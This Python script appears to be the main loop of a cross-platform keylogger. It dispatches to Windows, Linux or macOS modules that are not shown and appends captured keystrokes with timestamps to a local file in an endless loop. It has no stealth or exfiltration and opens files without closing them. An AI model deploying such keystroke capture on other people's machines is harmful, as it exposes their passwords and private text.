import platform
import os
import datetime

print(platform.system())
def run_current_platform(filepath):    
    if platform.system() == "Windows":
        from Windows import Windows
        Key = Windows(filepath)
        
    elif platform.system() == "Linux":
        from Linux import Linux
        Key = Linux(filepath)
        
    elif platform.system() == "Darwin":
        from Darwin import Darwin
        Key = Darwin(filepath)

    return Key


def logfile(file_path):  # provide file path  | 
    while True :
        log_Entry = run_current_platform(file_path)
        if os.path.exists(file_path):
            file = open(file_path,"a")
            data = str(log_Entry.Key_Pressed())+" "+str(datetime.datetime.now())+"\n"
            file.write(data)
        
        else :
            file = open(file_path,"w")
            file.write(log_Entry.Key_Pressed()+str(datetime.datetime.now()))        


def textfile(file_path):  # provide file path  | 
    
    while True :
        
        log_Entry = run_current_platform(file_path)
        if os.path.exists(file_path):
            data = log_Entry.Key_txt() 
            opentype = data[1]     
            file = open(file_path,opentype)
            file.write(data[0])
        
        else :
            data = log_Entry.Key_txt()
            file = open(file_path,data[1])
            file.write(data[0])        

def main():
        
    textfile("Demo.txt")
    # Obj = Linux()
    
    # Obj.Key_txt()

if __name__ == '__main__':
    main()
    
